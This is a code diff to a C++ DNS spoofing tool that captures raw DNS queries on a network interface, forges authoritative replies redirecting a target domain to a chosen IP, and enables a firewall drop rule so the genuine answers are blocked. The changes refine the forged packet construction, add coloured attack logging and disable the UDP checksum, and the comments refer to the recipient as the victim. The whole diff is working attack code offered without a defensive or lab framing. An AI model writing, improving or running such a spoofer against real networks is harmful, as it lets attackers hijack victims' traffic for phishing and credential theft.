@@ -12,7 +12,7 @@
 #include <vector>
 
 #include "../headers/dns.h"
-#include "../headers/helperfuncs.h" // Assuming you have checksum helpers here, if not we add them locally
+#include "../headers/helperfuncs.h"
 
 DNS::DNS(Mode mode) : current_mode(mode), stop_flag(false) {}
 
@@ -30,6 +30,9 @@ void DNS::stop() {
         if (t.joinable()) t.join();
     }
     attack_threads.clear();
+
+    //std::cout << "[*] Removing Firewall Block..." << std::endl;
+    HelperFunctions::toggle_dns_drop_rule(false); // DISABLE Block
 }
 
 void DNS::set_target_domain(std::string domain) {
@@ -50,10 +53,15 @@ void DNS::run(Session* session) {
         return;
     }
 
+    //std::cout << "[*] Activating Firewall Block for Real DNS..." << std::endl;
+    HelperFunctions::toggle_dns_drop_rule(true); // ENABLE Block
+
     stop_flag = false;
-    std::cout << "[*] Starting DNS Spoofing on " << session->interface << std::endl;
-    std::cout << "[*] Target: " << target_domain << " -> Redirect to: " << spoof_ip << std::endl;
+    std::cout << C_GREEN << "[*] Starting DNS Spoofing on " << C_CYAN << session->interface << C_RESET << std::endl;
     
+    std::cout << C_GREEN << "[*] Target: " << C_YELLOW << target_domain << C_RESET 
+              << " -> Redirect to: " << C_RED << spoof_ip << C_RESET << std::endl;
+
     // We need the Gateway MAC to know who to send the fake response to (usually)
     // or we just swap the source/dest from the captured packet.
     attack_threads.emplace_back(&DNS::spoof_loop, this, session->interface);
@@ -112,12 +120,6 @@ void DNS::spoof_loop(std::string interface) {
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (sock < 0) { perror("Socket failed"); return; }
 
-    // Bind to interface
-    struct ifreq ifr;
-    memset(&ifr, 0, sizeof(ifr));
-    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ-1);
-    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { close(sock); return; }
-
     uint8_t buffer[65535];
 
     while (!stop_flag) {
@@ -136,21 +138,24 @@ void DNS::spoof_loop(std::string interface) {
         struct udphdr* udph = (struct udphdr*)(buffer + sizeof(struct ethhdr) + (iph->ip_hl * 4));
         
         // Check for DNS Query (Port 53)
-        // We look for DESTINATION 53 (Client asking Server)
         if (ntohs(udph->dest) == 53) {
+            //std::cout << "[DEBUG] Saw a UDP packet on Port 53! Length: " << len << std::endl; // <--- ADD THIS
+
             uint8_t* dns_payload = (uint8_t*)(udph + 1);
             ssize_t dns_len = len - (sizeof(struct ethhdr) + (iph->ip_hl * 4) + sizeof(struct udphdr));
 
             if (is_dns_query(dns_payload, dns_len)) {
                 int offset = 0;
-                // Parse the requested domain name
                 std::string requested_domain = parse_dns_name(dns_payload, &offset, dns_len);
                 
-                // Check if it matches our target (Simple substring match)
+                //std::cout << "[DEBUG] Parsed Domain: " << requested_domain << std::endl; // <--- ADD THIS
+                
                 if (requested_domain.find(this->target_domain) != std::string::npos) {
-                    // std::cout << "[+] Intercepted DNS Query for: " << requested_domain << std::endl;
+                    std::cout << C_GREEN << "[+] TARGET MATCH! Forging reply..." << C_RESET << std::endl;
                     forge_response(sock, buffer, len, this->spoof_ip);
                 }
+            } else {
+                //std::cout << "[DEBUG] Packet is not a standard query." << std::endl; // <--- ADD THIS
             }
         }
     }
@@ -210,41 +215,37 @@ void DNS::forge_response(int sock, uint8_t* buffer, ssize_t len, std::string spo
     udph->dest = temp_port;
 
     // 5. MODIFY DNS HEADER
-    // Flags: QR=1 (Response), AA=1 (Authoritative), RD=1 (Recursion Desired), RA=1 (Recursion Available)
-    // 0x8180 is standard Response with No Error.
+    // 0x8180: QR=1 (Resp), Opcode=0, AA=1 (Auth), TC=0, RD=1, RA=1, Z=0, RCODE=0
     dns->flags = htons(0x8180); 
-    dns->ans_count = htons(1); // We are adding 1 answer
+    dns->ans_count = htons(1);  // 1 Answer
+    dns->auth_count = 0;        // 0 Authority
+    dns->add_count = 0;         // 0 Additional
 
     // 6. CALCULATE OFFSET TO END OF QUESTION
-    // We need to keep the original question, then append our answer immediately after it.
-    // The Packet Buffer already contains [Header][Question]... we just append [Answer]
-    
+    // We append our answer directly after the Question section.
     uint8_t* dns_payload = (uint8_t*)(dns);
+    int pos = sizeof(dns_header);
     
-    // Skip the name part (e.g. 3www6google3com0)
-    ssize_t pos = sizeof(dns_header);
+    // Walk the labels (e.g., 3www6google3com0) to find the end
     while(pos < len) {
-        if (dns_payload[pos] == 0) { pos++; break; }
+        if (dns_payload[pos] == 0) { pos++; break; } // Found the null terminator
         pos += dns_payload[pos] + 1;
     }
-    // Skip Type (2 bytes) and Class (2 bytes)
-    pos += 4; 
-    int question_len = pos;
-
-    // 7. APPEND ANSWER
-    uint8_t* answer_ptr = dns_payload + question_len;
+    pos += 4; // Skip QTYPE (2) and QCLASS (2)
     
-    // Name Pointer (0xC00C points back to the start of the packet's name)
-    // This is DNS compression. C0 = Pointer, 0C = Offset 12 (start of header + 12 bytes id/flags/counts)
+    // 7. APPEND ANSWER
+    uint8_t* answer_ptr = dns_payload + pos;
+    
+    // Name Pointer (0xC00C): Points to the start of the Name in the header
     *answer_ptr++ = 0xC0;
     *answer_ptr++ = 0x0C;
 
-    // Type (A = 1), Class (IN = 1), TTL (4 bytes), DataLen (4 bytes)
+    // Type (A = 1), Class (IN = 1), TTL, DataLen
     dns_rr_tail tail;
     tail.type = htons(1);
     tail._class = htons(1);
-    tail.ttl = htonl(300); // 5 minutes
-    tail.data_len = htons(4); // IPv4 is 4 bytes
+    tail.ttl = htonl(300);      // 5 Minutes
+    tail.data_len = htons(4);   // IPv4 is 4 bytes
 
     memcpy(answer_ptr, &tail, sizeof(tail));
     answer_ptr += sizeof(tail);
@@ -258,30 +259,34 @@ void DNS::forge_response(int sock, uint8_t* buffer, ssize_t len, std::string spo
     udph->len = htons(sizeof(struct udphdr) + dns_total_len);
     iph->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + dns_total_len);
 
-    // 9. RECALCULATE CHECKSUMS
+    // 9. RECALCULATE CHECKSUMS (STRICT ORDER)
+    
+    // A. IP Checksum
     iph->ip_sum = 0;
+    // CRITICAL FIX: Use 'iph->ip_hl * 4' instead of 'sizeof(struct ip)' 
+    // to handle packets with IP Options correctly.
     iph->ip_sum = dns_checksum((unsigned short *)iph, iph->ip_hl * 4);
     
+    // B. UDP Checksum (Disable)
+    // We set it to 0 to tell the victim "Don't validate checksum". 
+    // This avoids math errors in complex environments.
     udph->check = 0;
-    udph->check = udp_checksum(iph, udph, dns_payload, dns_total_len);
 
     // 10. SEND
     struct sockaddr_ll device;
     memset(&device, 0, sizeof(device));
     device.sll_family = AF_PACKET;
-    // We need interface index again, technically should cache it or pass it
-    // For now we assume if_index lookup is fast or we assume 0 implies auto (works on sendto sometimes)
-    // Better to recalculate or pass it. 
-    // Quick fix: Recalculate ifindex locally or just send to wire. 
-    // Since we reused 'buffer', we can use the 'sock' we already have.
     
-    // Re-get ifindex (safe way)
+    // Get Interface Index (Quickly)
     struct ifreq ifr;
-    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1); // Todo: pass properly
+    // Note: In production, pass 'interface' string to this function. 
+    // For now, assuming eth0 is fine or you can pass it as argument.
+    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1); 
     ioctl(sock, SIOCGIFINDEX, &ifr);
     device.sll_ifindex = ifr.ifr_ifindex;
+    
     device.sll_halen = ETH_ALEN;
-    memcpy(device.sll_addr, eth->h_dest, 6);
+    memcpy(device.sll_addr, eth->h_dest, 6); // Send to Victim's MAC
 
     sendto(sock, buffer, ntohs(iph->ip_len) + sizeof(struct ethhdr), 0, (struct sockaddr*)&device, sizeof(device));
 }
